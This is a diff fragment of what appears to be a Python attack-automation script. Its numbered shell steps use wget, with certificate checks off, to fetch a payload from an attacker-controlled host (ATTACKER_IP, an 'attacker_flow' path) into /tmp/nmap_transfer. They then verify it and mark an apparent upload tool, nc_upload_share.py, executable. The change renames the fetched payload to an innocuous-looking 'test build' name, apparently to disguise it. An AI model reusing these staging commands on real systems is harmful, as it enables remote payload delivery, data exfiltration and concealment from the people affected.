@@ -537,11 +537,11 @@ if __name__ == "__main__":
         # Step 17a-2: Verify download
         "ls -lh /tmp/nmap_transfer/nc_upload_share.py",
 
-        # Step 17a-3: Download ai_meeting_notes_tracker script
-        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/ai_meeting_notes_tracker -O ai_meeting_notes_tracker 2>&1",
+        # Step 17a-3: Download dphelper_v2.4_test_build script
+        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/dphelper_v2.4_test_build -O dphelper_v2.4_test_build 2>&1",
         
-        # Step 17a-4: Verify download of ai_meeting_notes_tracker
-        "ls -lh /tmp/nmap_transfer/ai_meeting_notes_tracker",
+        # Step 17a-4: Verify download of dphelper_v2.4_test_build
+        "ls -lh /tmp/nmap_transfer/dphelper_v2.4_test_build",
         
         # Step 17a-5: Make nc_upload_share executable
         "chmod +x /tmp/nmap_transfer/nc_upload_share.py",
